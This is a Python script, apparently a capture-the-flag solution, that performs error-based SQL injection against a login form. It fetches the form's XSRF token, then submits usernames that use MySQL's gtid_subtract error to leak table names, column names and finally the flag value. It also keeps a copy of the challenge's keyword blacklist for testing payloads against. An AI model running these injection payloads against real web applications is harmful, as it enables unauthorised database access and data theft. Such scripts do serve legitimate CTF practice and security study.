import requests
import html
import re
from urllib.parse import urlencode

r = requests.get('http://host:ip/login')
xsrf = re.search(r'name="_xsrf" value="(.*)"/>', r.text).group(1)
# find table name
#username = "abc'and(select(gtid_subtract((select(right(group_concat(table_name),hex('F')))from(information_schema.tables)),'A')))#".encode('latin-1')
# find column name
#username = "'and(select(gtid_subtract((select(group_concat(column_name))from(information_schema.columns)where(table_name)='PIsAukBsoucg'),'A')))#".encode('latin-1')
# find flag
username = "'and(select(gtid_subtract((select(wUpWAcapJIxP)from(PIsAukBsoucg)),'A')))#".encode('latin-1')
print(repr(username))
body = {'_xsrf':xsrf, 'username':username, 'password': 'def'}
body = urlencode(body)
#body = '_xsrf=%s&username=%s&password=%s' % (xsrf, quote(username), "def")
print(body)
blacklist = re.compile(r'gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`', flags=re.I|re.M)
#match = blacklist.search(username)
match = None
if match:
    print(match)
    exit(0)

r = requests.post('http://host:ip/login', data=body, headers = {'Cookie': '_xsrf=%s' % xsrf, 'Content-Type': 'application/x-www-form-urlencoded'})
print(r.text)
error = re.search(r'class="mdl-chip__text">(.*)</span>', r.text).group(1)
print(error)
